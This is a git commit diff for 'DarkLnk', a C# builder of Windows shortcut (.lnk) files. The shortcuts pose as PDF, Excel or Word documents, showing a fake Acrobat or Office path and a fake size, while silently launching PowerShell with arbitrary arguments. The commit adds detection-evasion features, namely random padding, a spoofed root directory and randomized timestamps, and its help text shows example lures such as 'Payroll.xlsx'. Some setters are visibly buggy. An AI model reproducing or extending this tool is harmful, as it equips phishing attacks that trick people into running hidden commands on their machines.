540c576ecef2203b25be6a6bff44bea3a60a3cb9
WarivRed <84249155+wariv@users.noreply.github.com>
2025-07-09 12:44:50 -0400

    Added obfuscation techniques, customization, and minor fixes.

--- DarkLnk/DarkLnk.cs
+++ DarkLnk/DarkLnk.cs
@@ -11,7 +11,6 @@ namespace DarkLnk
 {
     public class DarkLnk
     {
-
         public int LinkSize 
         { 
             get { return _fakeSize; } 
@@ -49,19 +48,66 @@ namespace DarkLnk
         {
             get { return _fakePath; }
             set { _fakePath = value; }
-        } 
-        
-        
+        }
+        public bool RandomPadding
+        {
+            get { return _randomPadding; }
+            set 
+            { 
+                _randomPadding = true;
+                _nullPadding = false;
+            }
+        }
+        public bool NullPadding
+        {
+            get { return _nullPadding; }
+            set 
+            { 
+                _nullPadding = value;
+                _randomPadding = false;
+            }
+        }
+        public string RootDirectory
+        {
+            get { return _rootDir; }
+            set
+            {
+                _rootDir = value.Substring(0,3); //Can only be 3 bytes
+
+            }
+        }
+        public bool FakeTime
+        {
+            get { return _fakeTimes; }
+            set
+            {
+                _nullPadding = value;
+            }
+        }
+        public string Binary
+        {
+            get { return _realExecPath; }
+            set
+            {
+                _realExecPath = value;
+
+            }
+        }
+
+        private Random _r = new Random();
         private int _fakeSize = int.MaxValue;
         private string _fakePath = @"Program Files\Adobe\Acrobat";
         private string _fakeExtension = "pdf";
         private string _fakeExtensionShort = "pdf";
-        //private string _fakePCName = "WindowsPC";
         private string _psCommand = "-command \"calc.exe\"";
         private string _outputName = "calc";
         private string _realExecPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
+        private bool _randomPadding = false;
+        private bool _nullPadding = false;
+        private string _rootDir = @"C:\";
+        private bool _fakeTimes = true;
 
-        
+
 
         public void BuildLink()
         {
@@ -74,8 +120,10 @@ namespace DarkLnk
             0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
             0x00 }; //Lnk Header with all non pertinent data nulled out.
 
-        //Intialize with Lnk Header
-        LnkBytes = JoinBytes(LnkBytes, linkHeader);
+
+
+            //Intialize with Lnk Header
+            LnkBytes = JoinBytes(LnkBytes, linkHeader);
 
             //Inject Fake Size if set
             if (_fakeSize != 0)
@@ -83,6 +131,17 @@ namespace DarkLnk
                 byte[] fksize = BitConverter.GetBytes(_fakeSize);
                 LnkBytes = InjectBytes(LnkBytes, 52, fksize);
             }
+
+            //Inject Fake Time if set
+            if (_fakeTimes)
+            {
+                DateTime dt = DateTime.Now.AddDays(_r.Next(29, 600)*-1);
+                LnkBytes = InjectBytes(LnkBytes, 28, Date2FileTime(dt)); //Creation Time
+                LnkBytes = InjectBytes(LnkBytes, 28+8, Date2FileTime(dt.AddMinutes(_r.Next(1,30))));//Last Access Time
+                LnkBytes = InjectBytes(LnkBytes, 28+16, Date2FileTime(dt.AddHours(_r.Next(1, 24))));//Last Write Time
+            }
+
+            
 
             //Add Link Item ID List
             LnkBytes = JoinBytes(LnkBytes,BuildItemIDList());
@@ -180,9 +239,9 @@ namespace DarkLnk
             //Item Size
             UInt16 itemSize = 25;
 
-            //Add extension. Uppercase is personal preference.
+            //Add root dir + extension 
             byte[] dataSection = new byte[23];
-            byte[] shortExtension = Encoding.UTF8.GetBytes("/" + _fakeExtensionShort.ToUpper());
+            byte[] shortExtension = Encoding.UTF8.GetBytes("/" + _rootDir.ToUpper());
 
             //Copy data into byte[] 
             Array.Copy(shortExtension, dataSection, shortExtension.Length);
@@ -203,11 +262,24 @@ namespace DarkLnk
             //Build sections of the item
             byte[] padding1 = new byte[] { 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
             byte[] pathUtf8 = Encoding.UTF8.GetBytes(_fakePath + "." + _fakeExtension);
-            byte[] padding2 = new byte[] {
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; //Almost anything can go here. nulls for simplicity.
-            byte[] pathUnicode = Encoding.Unicode.GetBytes(_fakePath + "." + _fakeExtension);
+
+
+            byte[] padding2 = { };
+            if (_randomPadding)
+            {
+                padding2 = GenerateRandomBinaryData(_r.Next(1, 2048), true, _r.Next(1, 32));
+            }
+            else if (_nullPadding)
+            {
+                padding2 = GenerateNullPadding(_r.Next(1, 2048));
+            }
+            else
+            {
+                padding2 = new byte[] { 0x00 };
+            }
+
+
+                byte[] pathUnicode = Encoding.Unicode.GetBytes(_fakePath + "." + _fakeExtension);
             byte[] termination = new byte[] {0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; //Includes null bytes ending the Link ID List
 
             //Calculate item size
@@ -239,15 +311,23 @@ namespace DarkLnk
 
             byte[] pathUtf8 = Encoding.UTF8.GetBytes(_realExecPath);
             byte[] padding1 = new byte[] {0x00, 0x00};
-            byte[] padding2 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
-                0x00, 0x00, 0x00, 0x00 }; //Almost anything can go here. Unicode string
+
+            byte[] padding2 = { }; //Padding 2 may not exceed 520 bytes and it must be even in length.
+            if (_randomPadding)
+            {
+                padding2 = GenerateRandomBinaryData(_r.Next(1, 260)*2, true, _r.Next(2, 32));
+            }
+            else if (_nullPadding)
+            {
+                padding2 = GenerateNullPadding(_r.Next(1, 260)*2);
+            }
+            else
+            {
+                padding2 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+            }
+
+
+
             byte[] padding2Length = BitConverter.GetBytes(Convert.ToInt16(padding2.Length / 2));
             byte[] argsUnicode = Encoding.Unicode.GetBytes(_psCommand);
             byte[] argsUnicodeLength = BitConverter.GetBytes(Convert.ToInt16(argsUnicode.Length / 2));
@@ -261,12 +341,47 @@ namespace DarkLnk
             results = JoinBytes(results, argsUnicodeLength);
             results = JoinBytes(results, argsUnicode);
 
+            //fix size
+            int headersize = 45 + pathUtf8.Length + 2;
+            results = InjectBytes(results, 0, BitConverter.GetBytes(headersize));
+
 
             //return item
             return results;
         }
 
+        private byte[] GenerateRandomBinaryData(int length,bool nullPadding = true, int paddingLength = 1)
+        {
+            
+            byte[] data = new byte[length];
+            int startPoint = nullPadding ? paddingLength : 0;
+            int endPoint = nullPadding ? paddingLength : 0;
 
+            for (int i=startPoint; i< (length - endPoint); i++)
+            {
+                data[i] = (byte)_r.Next(1, 256);
+            }
+            return data;
+        }
+
+        private byte[] GenerateNullPadding(int length)
+        {
+
+            byte[] data = new byte[length];
+
+            for (int i = 0; i < length; i++)
+            {
+                data[i] = (byte)0;
+            }
+            return data;
+        }
+
+
+        public static byte[] Date2FileTime(DateTime dateTime)
+        {
+            long fileTime = dateTime.ToFileTime();
+            return BitConverter.GetBytes(fileTime); // Little-endian by default
+        }
 
     }
 }
--- DarkLnk/Entry.cs
+++ DarkLnk/Entry.cs
@@ -20,13 +20,29 @@ namespace DarkLnk
         {
             for (int i = 0; i < args.Length; i++)
             {
-                if (args[i] == "-ex") { dl.LinkExtension = args[i + 1]; }
-                if (args[i] == "-o") { dl.OutputName = args[i + 1]; }
-                if (args[i] == "-p") { dl.LinkPath = args[i + 1]; }
+                try
+                {
+                    if (args[i] == "-ext") { dl.LinkExtension = args[i + 1]; }
+                    if (args[i] == "-o") { dl.OutputName = args[i + 1]; }
+                    if (args[i] == "-padnull") { dl.NullPadding = true; }
+                    if (args[i] == "-padrand") { dl.RandomPadding = true; }
+                    if (args[i] == "-fakeroot") { dl.RootDirectory = args[i + 1]; }
+                    if (args[i] == "-fakesize") { dl.LinkSize = Convert.ToInt32(args[i + 1]); }
+                    if (args[i] == "-fakepath") { dl.LinkPath = args[i + 1]; }
+                    if (args[i] == "-faketime") { dl.FakeTime = true; }
+                    if (args[i] == "-bin") { dl.Binary = args[i + 1]; }
 
-                //I choose to only accept base64 to avoid issues with quotes, space, and argument parsing
-                if (args[i] == "-cmdb64") { dl.Command = Encoding.UTF8.GetString(Convert.FromBase64String(args[i+1])); }
-                if (args[i] == "-h") { ShowHelp(); }
+
+
+                    if (args[i] == "-args") { dl.Command = args[i + 1]; }
+                    if (args[i] == "-argsb64") { dl.Command = Encoding.UTF8.GetString(Convert.FromBase64String(args[i + 1])); }
+                    if (args[i] == "-h") { ShowHelp(); }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Error parsing arguments: {ex.Message}");
+                    ShowHelp();
+                }
             }
 
         }
@@ -42,13 +58,33 @@ namespace DarkLnk
             Console.WriteLine(@"*                                            *");
             Console.WriteLine(@"**********************************************");
             Console.WriteLine();
-            Console.WriteLine(@" -ex     | The fake extension you want to emulate. e.g. pdf, xls, docx");
-            Console.WriteLine(@" -cmdb64 | The PowerShell command you want to run. See Examples");
-            Console.WriteLine(@" -o      | The name of the lnk file created. Defaults to calc");
-            Console.WriteLine(@" -p      | Fake path. Defaults to Program Files\Adobe\Acrobat (Optional)");
+
+            Console.WriteLine(@"[Primary Arguments]");
+            Console.WriteLine(@" -ext       | The fake extension you want to emulate. e.g. pdf (default), xls, docx");
+            Console.WriteLine(@" -args      | The arguments to send the executable.");
+            
             Console.WriteLine();
-            Console.WriteLine(" Example:");
-            Console.WriteLine(" DarkLnk.exe -o Report -ex xlsx -cmdb64 LWNvbW1hbmQgIm1rZGlyICJ0ZXN0IiI=");
+
+            Console.WriteLine(@"[Optional Arguments]");
+            Console.WriteLine(@" -o         | The name of the lnk file created. Default: 'calc'");
+            Console.WriteLine(@" -argsb64   | The arguments to send the executable. Use this if you have spaces or quotes (Base64 Encoded)");
+            Console.WriteLine(@" -bin       | Change binary to call. Default: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'");
+            Console.WriteLine(@"              **Only PowerShell seems to work. You are welcome to try other binaries if you wish**");
+            Console.WriteLine();
+
+            Console.WriteLine(@"[Optional Obfuscation Techniques]");
+            Console.WriteLine(@" -padnull   | Pad non-important areas with null bytes of random size.");
+            Console.WriteLine(@" -padrand   | Pad non-important areas with random bytes of random size.");
+            Console.WriteLine(@" -fakeroot  | Define root dir of target. Default: 'C:\'");
+            Console.WriteLine(@" -fakesize  | Define link size in header. Default: Int32.Max");
+            Console.WriteLine(@" -fakepath  | Fake path. Default: 'Program Files\Adobe\Acrobat'");
+            Console.WriteLine(@" -faketime  | Randomize date/time fields in the header.");
+            Console.WriteLine();
+
+            Console.WriteLine(" Examples:");
+            Console.WriteLine(@" DarkLnk.exe -o Report -ext pdf -argsb64 LWNvbW1hbmQgIm1rZGlyICJ0ZXN0IiI=");
+            Console.WriteLine(@" DarkLnk.exe -o Report -ext pdf -args ""-command mkdir test""");
+            Console.WriteLine(@" DarkLnk.exe -o Payroll -ext xlsx -args ""mkdir test"" -padrand -faketime -fakepath ""Microsoft Office 365""");
             Environment.Exit(0);
         }
 
